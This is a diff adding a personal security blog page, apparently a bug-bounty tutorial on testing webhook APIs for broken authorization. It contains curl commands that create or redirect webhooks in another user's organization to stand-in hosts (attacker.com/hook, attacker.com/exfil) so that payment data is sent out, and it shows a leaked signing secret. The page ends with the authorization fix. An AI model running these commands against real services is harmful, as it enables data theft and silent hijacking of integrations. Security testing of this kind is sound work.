+        <p>the core question is simple: can a low-privileged user create, read, update, or delete webhooks that belong to another user or organization?</p>
+
+        <p>start by mapping the webhook api. most implementations follow a predictable pattern:</p>
+
+<pre><span class="g">POST</span>   /api/webhooks          <span class="c"># create</span>
+<span class="g">GET</span>    /api/webhooks          <span class="c"># list</span>
+<span class="g">GET</span>    /api/webhooks/:id      <span class="c"># read</span>
+<span class="g">PUT</span>    /api/webhooks/:id      <span class="c"># update</span>
+<span class="g">DELETE</span> /api/webhooks/:id      <span class="c"># delete</span></pre>
+
+        <p>create two accounts — one admin, one low-priv. use burp to capture every webhook request from the admin account. then replay each one swapping in the low-priv token.</p>
+
+<pre><span class="c"># create a webhook as low-priv user targeting admin's org</span>
+<span class="g">$</span> curl <span class="y">-X POST</span> https://target.com/api/webhooks \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" \
+  <span class="y">-H</span> "Content-Type: application/json" \
+  <span class="y">-d</span> '{
+    "url": "https://attacker.com/hook",
+    "events": ["payment.completed"],
+    "org_id": "ADMIN_ORG_ID"
+  }'</pre>
+
+        <p>if that returns <code>201</code>, you just created a webhook in someone else's organization. every time a payment completes, the data goes to your server. that's a critical finding.</p>
+
+        <p>but don't stop at create. test every operation independently — they often have different auth checks:</p>
+
+<pre><span class="c"># list another org's webhooks</span>
+<span class="g">$</span> curl <span class="y">-s</span> https://target.com/api/webhooks?org_id=ADMIN_ORG_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" | jq .
+
+<span class="c"># read a specific webhook's config (leaks the destination url)</span>
+<span class="g">$</span> curl <span class="y">-s</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" | jq .
+
+<span class="c"># update: redirect an existing webhook to attacker-controlled url</span>
+<span class="g">$</span> curl <span class="y">-X PUT</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" \
+  <span class="y">-d</span> '{"url": "https://attacker.com/exfil"}'
+
+<span class="c"># delete: disrupt monitoring/integrations</span>
+<span class="g">$</span> curl <span class="y">-X DELETE</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN"</pre>
+
+        <p>the most common patterns i've seen:</p>
+
+        <p><code>create</code> is checked, but <code>update</code> isn't — so you can't make a new webhook in their org, but you can hijack an existing one by changing the destination url. silent data exfiltration.</p>
+
+        <p><code>list</code> and <code>read</code> are often wide open — leaking webhook configs, secrets, and destination urls. even if you can't modify anything, knowing where their data flows is valuable intel.</p>
+
+        <p><code>delete</code> is sometimes unprotected — an attacker could silently break an org's integrations. subtle denial of service that's hard to debug.</p>
+
+        <p>another thing to check: webhook secrets. some apps include a signing secret in the response body when you create or read a webhook:</p>
+
+<pre>{
+  "id": "wh_123",
+  "url": "https://customer.com/hook",
+  <span class="g">"secret": "whsec_a1b2c3d4e5f6"</span>,
+  "events": ["payment.completed"]
+}</pre>
+
+        <p>if a low-priv user can read that secret, they can forge webhook payloads and trick the receiving server into processing fake events. that's a whole different class of attack.</p>
+
+        <p>the fix is straightforward but rarely implemented correctly: every webhook operation should validate that the requesting user has the right role in the target organization. not just auth — <em>authorization</em>. most apps check the first, skip the second.</p>
+      </div>
+    </div>
+
+    <footer>
+      <div>no frameworks were harmed in the making of this site · 0xDEADC0DE</div>
+      <br>
+      <span class="cursor"></span>
+    </footer>
+
+  </div>
+
+  <script>
+    (function() {
+      var text = 'bruno menna';
+      var el = document.getElementById('typed');
+      var i = 0;
+      function type() {
+        if (i <= text.length) {
+          el.textContent = text.slice(0, i);
+          i++;
+          setTimeout(type, 80 + Math.random() * 40);
+        }
+      }
+      setTimeout(type, 400);
+    })();
+
+    function show(id, el) {
+      var current = document.querySelector('.page.visible');
+      var next = document.getElementById(id);
+      document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+      if (el) el.classList.add('active');
+      if (current && current !== next) {
+        current.style.opacity = '0';
+        current.style.transform = 'translateY(6px)';
+        setTimeout(function() {
+          current.classList.remove('visible');
+          current.style.opacity = '';
+          current.style.transform = '';
+          next.classList.add('visible');
+          requestAnimationFrame(function() {
+            next.style.opacity = '1';
+            next.style.transform = 'translateY(0)';
+          });
+        }, 200);
+      } else {
+        next.classList.add('visible');
+        next.style.opacity = '1';
+        next.style.transform = 'translateY(0)';
+      }
+      window.scrollTo(0, 0);
+    }
+  </script>
+</body>
+</html>
